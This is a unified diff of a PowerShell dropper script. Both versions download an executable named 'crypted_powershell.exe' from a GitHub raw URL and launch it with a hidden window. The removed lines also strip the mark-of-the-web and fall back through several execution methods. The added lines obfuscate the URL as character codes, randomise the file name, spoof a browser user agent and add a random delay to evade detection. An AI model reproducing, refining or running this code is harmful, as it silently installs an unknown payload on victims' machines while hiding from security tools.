@@ -1,15 +1,10 @@
-$ErrorActionPreference='SilentlyContinue'
-[Net.ServicePointManager]::SecurityProtocol=3072
-$u='https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/crypted_powershell.exe'
-$p=Join-Path $env:TEMP 'crypted_powershell.exe'
-$b=$null
-try{$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';$b=$w.DownloadData($u)}catch{}
-if(-not $b -or $b.Length -lt 100000){try{Start-BitsTransfer -Source $u -Destination $p;$b=[IO.File]::ReadAllBytes($p)}catch{}}
-if(-not $b -or $b.Length -lt 100000 -or $b[0] -ne 77 -or $b[1] -ne 90){return}
-[IO.File]::WriteAllBytes($p,$b)
-try{Unblock-File -LiteralPath $p}catch{}
-try{Remove-Item -LiteralPath ($p+':Zone.Identifier') -Force}catch{}
-$ran=$false
-try{if(Start-Process -FilePath $p -WorkingDirectory $env:TEMP -WindowStyle Hidden -PassThru){$ran=$true}}catch{}
-if(-not $ran){try{$i=New-Object Diagnostics.ProcessStartInfo;$i.FileName=$p;$i.WorkingDirectory=$env:TEMP;$i.UseShellExecute=$true;$i.WindowStyle='Hidden';if([Diagnostics.Process]::Start($i)){$ran=$true}}catch{}}
-if(-not $ran){cmd /c start "" "$p"}
+$u = -join ([char[]](104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,109,97,116,118,101,106,115,107,108,97,114,111,118,57,45,99,121,98,101,114,47,109,121,47,114,97,119,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,99,114,121,112,116,101,100,95,112,111,119,101,114,115,104,101,108,108,46,101,120,101))
+$n = -join ((48..57+97..122)|Get-Random -Count 10|%{[char]$_})
+$p = "$env:LOCALAPPDATA\$n.exe"
+try {
+  $wc = New-Object Net.WebClient
+  $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
+  $wc.DownloadFile($u, $p)
+} catch {}
+Start-Sleep -m (Get-Random -Min 400 -Max 1200)
+if (Test-Path $p) { Start-Process $p -WindowStyle Hidden }
